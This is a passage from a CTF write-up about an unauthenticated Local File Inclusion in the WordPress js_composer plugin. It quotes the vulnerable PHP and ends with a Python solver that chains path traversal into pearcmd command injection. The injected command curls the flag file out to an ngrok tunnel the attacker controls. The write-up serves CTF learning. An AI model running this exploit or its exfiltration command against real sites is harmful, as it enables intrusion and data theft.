But how do we download the plugin? Easy, just search for it on GitHub. For example, you can copy a string from `changelog.txt` and use it in the GitHub search. I found a GitHub repository containing the same version of `js_composer` here: <https://github.com/gerekper/ganjaking/blob/fb60ac75a96e47ab12d704a68657de86bc375c4c/wp-content/plugins/js_composer/changelog.txt#L4>.

How do we find the vulnerability? Using a diff program, we can compare different versions of the plugin—the patched one and the unpatched one, to identify where the Local File Inclusion (LFI) vulnerability is. The LFI can be found in the class here:

server-given/docker/wordpress/toolbox/plugins/js\_composer/include/autoload/class-vc-post-custom-layout.php

    ```php
    class Vc_PostCustomLayout {
    ...snip...
    	public function __construct() {
    		add_action( 'template_include', [ $this, 'switchPostCustomLayout' ], 11 );
    	}

    	/**
    	 * Change the path of the current template to our custom layout.
    	 * @since 7.0
    	 *
    	 * @param string $template The path of the template to include.
    	 * @return string
    	 */
    	public function switchPostCustomLayout( $template ) {
    		if ( ! is_singular() ) {
    			return $template;
    		}
    		$layout_name = $this->getCustomLayoutName();
    		if ( ! $layout_name || 'default' === $layout_name ) {
    			return $template;
    		}

    		$custom_layout_path = $this->getCustomLayoutPath( $layout_name );
    		if ( $custom_layout_path ) {
    			$template = $custom_layout_path;
    		}

    		return apply_filters( 'vc_post_custom_layout_template', $template, $layout_name );
    	}

    	/**
    	 * Get name of the custom layout.
    	 * @note on a plugin core level right now we have only 'blank' layout.
    	 * @since 7.0
    	 *
    	 * @return string
    	 */
    	public function getCustomLayoutName() {
    		global $post;
    		if ( $this->isLayoutSwitchedInFrontendEditor() ) {
    			$layout_name = $this->getLayoutNameFromGetParams();
    		} else {
    			$layout_name = $this->getLayoutFromMeta();
    		}

    		$layout_name = empty( $layout_name ) ? '' : $layout_name;

    		if ( ! empty( $post->post_content ) && ! $layout_name ) {
    			$layout_name = 'default';
    		}

    		return apply_filters( 'vc_post_custom_layout_name', $layout_name );
    	}

    	/**
    	 * Check if user switched layout in frontend editor.
    	 * @note in such cases we should reload the page
    	 * @since 7.0
    	 *
    	 * @return bool
    	 */
    	public function isLayoutSwitchedInFrontendEditor() {
    		$params = $this->getRequestParams();

    		return isset( $params['vc_post_custom_layout'] );
    	}

    	/**
    	 * For a frontend editor we keep layout as get param
    	 * when we switching it inside editor and show user new layout inside editor.
    	 * @since 7.0
    	 *
    	 * @return false|string
    	 */
    	public function getLayoutNameFromGetParams() {
    		$params = $this->getRequestParams();

    		return empty( $params['vc_post_custom_layout'] ) ? false : $params['vc_post_custom_layout'];
    	}

    	/**
    	 * Retrieve get params.
    	 * @description  we should obtain params from $_SERVER['HTTP_REFERER']
    	 * if we try to get params inside iframe and from regular $_GET when outside
    	 * @since 7.0
    	 *
    	 * @return array|false
    	 */
    	public function getRequestParams() {
    		if ( ! vc_is_page_editable() && ! vc_is_inline() ) {
    			return false;
    		}

    		// inside iframe
    		if ( vc_is_page_editable() ) {
    			$params = $this->getParamsFromServerReferer();
    			// outside iframe
    		} else {
    			$params = $_GET;
    		}

    		return $params;
    	}
    ...snip...
    	/**
    	 * Get path of the custom layout.
    	 * @note we keep all plugin layouts in include/templates/pages/layouts/ folder.
    	 * @since 7.0
    	 *
    	 * @param string $layout_name
    	 * @return string|false
    	 */
    	public function getCustomLayoutPath( $layout_name ) {
    		$custom_layout_path = vc_template( '/pages/layouts/' . $layout_name . '.php' );
    		if ( ! is_file( $custom_layout_path ) ) {
    			return false;
    		}

    		return $custom_layout_path;
    	}

    	/**
    	 * Get href for the custom layout by layout name.
    	 * @since 7.0
    	 *
    	 * @param string $layout_name
    	 * @return string
    	 */
    	public function getLayoutHrefByLayoutName( $layout_name ) {
    		if ( vc_is_page_editable() || vc_is_inline() ) {
    			$frontend_editor = new Vc_Frontend_Editor();
    			$href = $frontend_editor->getInlineUrl( get_the_ID() ) . '&vc_post_custom_layout=' . $layout_name;
    		} else {
    			$href = '#';
    		}

    		return $href;
    	}
    ...snip...
    }

    new Vc_PostCustomLayout();

    ```

See the `template_include`? The `template_include` action is special because its return value will be included using `include` in WordPress. This means the return value is actually the sink here.

The interesting part is that I can make it work without authentication by adding certain parameters to the URL. Unlike the CVE, which requires Author+ privileges, this is actually an unauthenticated CVE if you dive further into the source code. You can bypass the authentication check.

Anyway, you can check my solver to see what I added to the URL parameters to achieve unauthenticated LFI.

## Solver

```python
from time import sleep
import httpx
import asyncio
import os
from pyngrok import ngrok
from flask import Flask, request
from threading import Thread

PORT = 6666
TUNNEL = ngrok.connect(PORT, "http").public_url

print("TUNNEL:", TUNNEL)

URL = "http://52.77.81.199:9197/"
HELLO_WORLD_FORM = "http://52.77.81.199:9197/2025/02/18/hello-world/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    def exploit(self):
        return os.popen(r'''curl "'''+HELLO_WORLD_FORM+r'''?vc_post_custom_layout=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/peclcmd&vc_editable=1&vc_inline=1&x=+run-tests+-i+-r\`curl\$\{IFS\}'''+TUNNEL+r'''\$\{IFS\}--upload-file\$\{IFS\}/fla*\`+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt" ''').read()

def webServer():
    app = Flask(__name__)
    @app.put("/<path:path>")
    def home(path):
        print(request.data)
        return "ok"
    return Thread(target=app.run, args=('0.0.0.0', PORT))

async def main():
    api = API()
    server = webServer()
    server.start()
    sleep(5)
    res = api.exploit()
    print(res)
    server.join()

if __name__ == "__main__":
    asyncio.run(main())
```

### Flag

![](./imgs/image_5HeVy1J1.png)
